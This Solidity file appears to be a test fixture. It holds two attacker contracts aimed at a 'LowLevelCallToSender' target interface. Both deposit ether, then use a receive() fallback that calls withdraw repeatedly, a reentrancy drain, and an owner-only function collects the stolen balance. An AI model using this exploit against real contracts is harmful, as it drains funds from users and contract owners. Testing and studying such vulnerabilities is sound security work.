// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../../interfaces/single-function/ILowLevelCallToSender.sol";

contract LowLevelCallToSender_Attacker {
    ILowLevelCallToSender public c;
    address public owner;

    constructor(address _c) {
        c = ILowLevelCallToSender(_c);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        c.deposit{value: 1 ether}();
        c.withdraw();
    }

    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.withdraw();
        }
    }
}

contract LowLevelCallToSender_AttackerTwoSteps {
    ILowLevelCallToSender public c;
    address public owner;

    constructor(address _c) {
        c = ILowLevelCallToSender(_c);
        owner = msg.sender;
    }

    function attackStep1() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        c.deposit{value: 1 ether}();
    }

    function attackStep2() external payable {
        c.withdraw();
    }

    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.withdraw();
        }
    }
}
